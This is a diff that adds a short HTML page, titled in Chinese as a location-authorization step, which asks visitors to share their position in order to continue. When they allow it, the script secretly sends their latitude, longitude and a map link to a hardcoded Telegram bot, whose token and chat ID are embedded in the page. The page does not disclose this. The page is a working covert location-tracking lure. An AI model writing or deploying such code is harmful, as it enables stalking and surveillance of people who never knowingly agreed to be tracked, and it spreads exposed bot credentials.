@@ -1,0 +1,44 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>位置授权</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <h2>请授权定位以继续</h2>
+  <button onclick="getLocation()">获取我的位置</button>
+  <p id="msg">等待授权中...</p>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      } else {
+        document.getElementById("msg").innerText = "你的设备不支持定位";
+      }
+    }
+
+    function success(pos) {
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      document.getElementById("msg").innerText = `定位成功：${lat}, ${lng}`;
+
+      fetch("https://api.telegram.org/bot7619871013:AAGtnEOSiFe73Bmkv_MzlQhvn3sQqdCw60o/sendMessage", {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: "5039078823",
+          text: `定位成功📍\n经度：${lng}\n纬度：${lat}\n地图：https://www.google.com/maps?q=${lat},${lng}`
+        })
+      });
+    }
+
+    function error(err) {
+      document.getElementById("msg").innerText = "定位失败或用户拒绝授权";
+    }
+  </script>
+</body>
+</html>
